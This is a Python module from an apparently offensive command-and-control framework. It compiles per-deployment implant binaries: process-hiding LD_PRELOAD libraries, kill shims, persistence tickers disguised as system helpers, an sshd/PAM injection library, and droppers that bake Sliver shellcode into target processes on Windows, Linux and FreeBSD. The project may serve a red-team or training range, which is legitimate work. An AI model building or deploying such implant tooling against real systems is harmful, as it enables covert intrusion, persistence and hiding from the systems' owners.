"""Per-deploy shim recompile engine (docs/PLAN_build_check_deploy_name_pools.md §5A.2).

Compiled shims/tickers/.so hooks BAKE a reference to another artifact (a beacon's
path, a hidden process comm, an injected implant's path). When the BUILD step
pools that referenced artifact, the shim must be recompiled with the recorded
value so it still resolves it — **functional coupling**, not comm-scoring. This
module mirrors each ``scripts/build/build_*.sh`` toolchain invocation and adds the
pool-driven ``-D<KEY>="<value>"`` defines (the sources are ``#ifndef``-guarded so
un-overridden builds stay byte-identical).

Results are cached by ``(source_sha256, defines)`` in ``SHIM_CACHE_DIR`` and
recorded in the build manifest (`c2/build_manifest.py`), which is both the cache
oracle and the CHECK step's baked-value verifier. Toolchain-missing / compile
failure raises (fail loud) — never silently ships a stale-path shim.
"""
from __future__ import annotations

import datetime as dt
import hashlib
import shutil
import subprocess
from dataclasses import dataclass, field
from pathlib import Path

from fastapi_backend.c2 import build_manifest
from fastapi_backend.core.config import config


class ShimBuilderError(Exception):
    """Base class for shim build failures."""


class ShimToolchainError(ShimBuilderError):
    """A required compiler / linker is not installed on the C3rberus host."""


class ShimBuildError(ShimBuilderError):
    """The compiler ran but exited non-zero."""


@dataclass(frozen=True)
class ShimSpec:
    """How to compile one coupled shim, mirroring its ``scripts/build/build_*.sh``."""

    source: str                       # rel to PROJECT_ROOT
    output_basename: str              # cache filename stem
    compiler: str                     # gcc | clang | x86_64-w64-mingw32-gcc
    base_args: list[str]              # fixed compile args (incl. non-pooled -D)
    define_keys: tuple[str, ...]      # pool-driven -D keys this shim accepts
    requires: list[str] = field(default_factory=list)  # extra binaries needed
    # Optional sysroot (relative to PROJECT_ROOT); injected as --sysroot=<abs> at build time.
    # Required for cross-compiled shims that link against libc (e.g. firewall_self_inject).
    sysroot_rel: str | None = None


_FBSD = ["--target=x86_64-unknown-freebsd15", "-O2", "-fuse-ld=lld"]

# Keyed by ioc_name → the coupled compiled artifact it deploys. `windows_implant_inject`
# (svc_dll_loader.c → nethost DLL) is #ifndef-guarded but has no committed build
# script yet, so it is intentionally absent until one exists.
SHIM_SPECS: dict[str, ShimSpec] = {
    "linux_kill_shim": ShimSpec(
        "implant_src/linux_kill_shim.c", "kill_shim_linux", "gcc",
        ["-O2", "-static"], ("BEACON_PATH", "BEACON_COMM")),
    "firewall_kill_shim": ShimSpec(
        "implant_src/bsd_kill_shim.c", "kill_shim_freebsd", "clang",
        [*_FBSD, "-nostdlib", "-static"], ("BEACON_PATH",), requires=["ld.lld"]),
    "linux_hide_library": ShimSpec(
        "implant_src/ld_preload_hide_linux.c", "hide_library_linux.so", "gcc",
        # `-I implant_src` picks up glibc_compat.h (the .symver pins), which
        # is included at the very top of ld_preload_hide_linux.c. Without
        # the pins, Kali's gcc 15 tags libc refs at @GLIBC_2.34/2.33/2.38
        # and the resulting .so bricks any glibc-<-2.33 target as soon as
        # it lands in /etc/ld.so.preload (bricked polus on 2026-09-10; see
        # implant_src/glibc_compat.h header for the full story).
        # `--no-as-needed -l:libdl.so.2` forces libdl.so.2 into DT_NEEDED
        # so `dlsym@GLIBC_2.2.5` resolves on pre-glibc-2.34 targets, where
        # dlsym still lives in libdl not libc.
        ["-shared", "-fPIC", "-O2", "-Wl,-z,now", "-Wl,-z,relro",
         "-I", "implant_src",
         "-lpthread",
         "-Wl,--no-as-needed", "-Wl,-l:libdl.so.2", "-Wl,--as-needed"],
        ("HIDDEN_COMM",)),
    "firewall_hide_library": ShimSpec(
        "implant_src/ld_preload_hide_bsd.c", "hide_library_bsd.so", "clang",
        [*_FBSD, "-shared", "-fPIC", "-nostdlib", "-Wl,-z,now", "-Wl,-z,relro"],
        ("HIDDEN_COMM",), requires=["ld.lld"]),
    "firewall_implant_nginx_shim": ShimSpec(
        "implant_src/bsd_nginx_shim.c", "libssl_util.so", "clang",
        [*_FBSD, "-shared", "-fPIC", "-nostdlib"], ("BEACON_PATH",), requires=["ld.lld"]),
    "linux_implant_inject_sshd": ShimSpec(
        "implant_src/linux_shim_memfd.c", "libpam_recv.so", "gcc",
        ["-shared", "-fPIC", "-nostartfiles"], ("PAM_PATH",)),
    "firewall_implant_devd_kqueue": ShimSpec(
        "implant_src/bsd_devd_ticker.c", "devd_helper", "clang",
        [*_FBSD, "-DINTERVAL_SEC=300", "-nostdlib", "-static"],
        ("IMPLANT_PATH", "IMPLANT_PIDFILE", "PIDFILE"), requires=["ld.lld"]),
    "linux_implant_udev": ShimSpec(
        "implant_src/linux_udev_ticker.c", "acpi_handler", "gcc",
        ["-O2", "-DINTERVAL_SEC=300", "-static"],
        ("PIDFILE", "DEVNAME", "COMM_NAME", "DISGUISE")),
    # Self-inject dropper shims: bake Sliver shellcode + target process at Generate time.
    # SHELLCODE_B64 = base64-encoded raw shellcode bytes.
    # INJECT_TARGET / INJECT_TARGET_COMM = process name to inject into.
    "windows_self_inject": ShimSpec(
        "implant_src/self_inject_windows.c",
        "self_inject_windows.exe",
        "x86_64-w64-mingw32-gcc",
        ["-O2", "-mwindows", "-lws2_32"],
        ("SHELLCODE_B64", "INJECT_TARGET"),
    ),
    "windows_self_inject_wmi": ShimSpec(
        "implant_src/self_inject_windows.c",
        "self_inject_wmi_windows.exe",
        "x86_64-w64-mingw32-gcc",
        ["-O2", "-mwindows", "-lws2_32"],
        ("SHELLCODE_B64", "INJECT_TARGET"),
    ),
    "linux_self_inject": ShimSpec(
        "implant_src/self_inject_linux.c",
        "self_inject_linux",
        "gcc",
        ["-O2", "-static"],
        ("SHELLCODE_B64", "INJECT_TARGET_COMM"),
    ),
    "linux_self_inject_udev": ShimSpec(
        "implant_src/self_inject_linux.c",
        "self_inject_udev_linux",
        "gcc",
        ["-O2", "-static"],
        ("SHELLCODE_B64", "INJECT_TARGET_COMM"),
    ),
    "firewall_self_inject": ShimSpec(
        "implant_src/self_inject_freebsd.c",
        "self_inject_freebsd",
        "clang",
        [*_FBSD, "-static"],
        ("SHELLCODE_B64", "INJECT_TARGET_COMM"),
        requires=["ld.lld"],
        sysroot_rel="scripts/build/fbsd15-sysroot",
    ),
    "firewall_self_inject_devd": ShimSpec(
        "implant_src/self_inject_freebsd.c",
        "self_inject_devd_freebsd",
        "clang",
        [*_FBSD, "-static"],
        ("SHELLCODE_B64", "INJECT_TARGET_COMM"),
        requires=["ld.lld"],
        sysroot_rel="scripts/build/fbsd15-sysroot",
    ),
}


def is_recompilable(ioc_name: str) -> bool:
    """Whether this IOC has a coupled shim `build_shim` can recompile."""
    return ioc_name in SHIM_SPECS


def committed_payload(ioc_name: str) -> Path | None:
    """The pre-built (committed) payload path for a coupled shim, if a spec exists.

    Used by CHECK when nothing is pooled for the IOC — the committed
    ``iocs/payloads/<basename>`` is what deploy would use.
    """
    spec = SHIM_SPECS.get(ioc_name)
    if spec is None:
        return None
    return Path(config.PROJECT_ROOT) / "iocs" / "payloads" / spec.output_basename


def expected_artifact(ioc_name: str, defines: dict[str, str]) -> Path | None:
    """The cache path a recompile with ``defines`` would produce, if a spec exists."""
    spec = SHIM_SPECS.get(ioc_name)
    if spec is None:
        return None
    return _output_path(spec, _cache_key(spec, defines))


# Defines whose VALUE is a full payload (megabytes of base64), not a short name.
# These are recorded/compared/keyed by digest so the build manifest stays small and
# CHECK can recompute the same cache key without re-generating the payload
# (docs/PLAN_self_inject_shellcode_baking.md §6 D5).
_DIGEST_DEFINE_KEYS = ("SHELLCODE_B64",)
_DIGEST_PREFIX = "sha256:"


def manifest_defines(defines: dict[str, str]) -> dict[str, str]:
    """Manifest-safe view of ``defines``: payload values collapsed to a digest.

    Used consistently by the cache key, the manifest record, and every
    ``defines_match`` comparison, so BUILD and CHECK always agree. A different
    payload still yields a different digest → different cache key → recompile,
    which is what keeps a freshly-generated mTLS identity from being silently
    served out of an old cache entry.

    Idempotent: an already-digested value is passed through unchanged, so callers
    that read digested defines back out of the manifest (CHECK, artifact eviction)
    compute the SAME cache key that BUILD did.
    """
    out: dict[str, str] = {}
    for k, v in defines.items():
        if k in _DIGEST_DEFINE_KEYS and not v.startswith(_DIGEST_PREFIX):
            out[k] = _DIGEST_PREFIX + hashlib.sha256(v.encode()).hexdigest()
        else:
            out[k] = v
    return out


def _cache_key(spec: ShimSpec, defines: dict[str, str]) -> str:
    src_hash = build_manifest.source_sha256(spec.source) or "nosrc"
    keyed = manifest_defines(defines)
    payload = src_hash + "|" + "&".join(f"{k}={keyed[k]}" for k in sorted(keyed))
    return hashlib.sha256(payload.encode()).hexdigest()[:8]


def _output_path(spec: ShimSpec, key: str) -> Path:
    cache_dir = Path(config.SHIM_CACHE_DIR)
    if not cache_dir.is_absolute():
        cache_dir = Path(config.PROJECT_ROOT) / cache_dir
    return cache_dir / f"{spec.output_basename}.{key}"


_HEADER_CHUNK = 1024  # chars per line in generated header


def _build_define_args(
    defines: dict[str, str], out_path: Path
) -> tuple[list[str], list[str]]:
    """Return (define_args, include_args) for a compile command.

    Large payload defines (SHELLCODE_B64) exceed ARG_MAX when passed as -D on
    the command line (~23 MB of base64 for a 17 MB .so). Instead, write them
    into a generated header file alongside the output artifact and pass
    -include <path> so the compiler reads the define from disk, not argv.
    Small defines are still passed as -D<K>="<v>" arguments.
    """
    define_args: list[str] = []
    include_args: list[str] = []
    for k, v in defines.items():
        if k in _DIGEST_DEFINE_KEYS and len(v) > 4096:
            hdr_path = out_path.parent / f"{out_path.name}.{k}.h"
            _write_define_header(hdr_path, k, v)
            include_args += ["-include", str(hdr_path)]
        else:
            define_args.append(f'-D{k}="{v}"')
    return define_args, include_args


def _write_define_header(path: Path, key: str, value: str) -> None:
    """Write a C header that #define's ``key`` to ``value`` as chunked string literals."""
    lines = [f"#ifndef {key}"]
    chunks = [f'"{value[i:i + _HEADER_CHUNK]}"' for i in range(0, len(value), _HEADER_CHUNK)]
    lines.append(f"#define {key} \\")
    for i, chunk in enumerate(chunks):
        cont = " \\" if i < len(chunks) - 1 else ""
        lines.append(f"    {chunk}{cont}")
    lines.append("#endif")
    path.write_text("\n".join(lines) + "\n")


def build_shim(ioc_name: str, defines: dict[str, str], *, force: bool = False) -> Path:
    """Recompile ``ioc_name``'s coupled shim with pool-driven ``defines``.

    Returns the cached binary path. Cache hit (manifest defines match + current)
    skips the compile unless ``force``. Raises ``ShimToolchainError`` if the
    toolchain is absent, ``ShimBuildError`` on a non-zero compile.
    """
    spec = SHIM_SPECS.get(ioc_name)
    if spec is None:
        raise ShimBuilderError(f"no shim spec for {ioc_name!r}")
    bad = set(defines) - set(spec.define_keys)
    if bad:
        raise ShimBuilderError(
            f"{ioc_name}: unknown define(s) {sorted(bad)}; accepts {spec.define_keys}"
        )

    key = _cache_key(spec, defines)
    out = _output_path(spec, key)
    if not force and build_manifest.defines_match(out, manifest_defines(defines)):
        return out  # cache hit — already compiled with these exact defines

    for binname in [spec.compiler, *spec.requires]:
        if shutil.which(binname) is None:
            raise ShimToolchainError(
                f"{ioc_name}: required toolchain '{binname}' not found on host"
            )

    src = Path(config.PROJECT_ROOT) / spec.source
    if not src.exists():
        raise ShimBuilderError(f"{ioc_name}: source {src} missing")

    out.parent.mkdir(parents=True, exist_ok=True)
    sysroot_args: list[str] = []
    if spec.sysroot_rel:
        sysroot_path = Path(config.PROJECT_ROOT) / spec.sysroot_rel
        if not sysroot_path.exists():
            raise ShimToolchainError(
                f"{ioc_name}: sysroot missing at {sysroot_path} — "
                "run scripts/build/setup_fbsd15_sysroot.sh to populate it"
            )
        sysroot_args = [f"--sysroot={sysroot_path}"]
    define_args, include_args = _build_define_args(defines, out)
    cmd = [spec.compiler, *spec.base_args, *sysroot_args,
           *include_args, *define_args, "-o", str(out), str(src)]
    # The generated payload header duplicates the whole payload on disk (~23 MB for a
    # real Sliver blob). Every build generates a fresh payload → a fresh cache key →
    # a fresh header, so leaving them behind leaks disk without bound. The compiler
    # only needs them for the duration of this call.
    _headers = [Path(include_args[i + 1])
                for i, a in enumerate(include_args) if a == "-include"]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    finally:
        for _h in _headers:
            _h.unlink(missing_ok=True)
    if proc.returncode != 0:
        raise ShimBuildError(
            f"{ioc_name}: compile failed ({proc.returncode}): {proc.stderr.strip()[:500]}"
        )

    build_manifest.record(
        out, ioc=ioc_name, source_rel=spec.source,
        defines=manifest_defines(defines),
        toolchain=spec.compiler,
        built_at=dt.datetime.now(dt.UTC).isoformat(),
    )
    return out
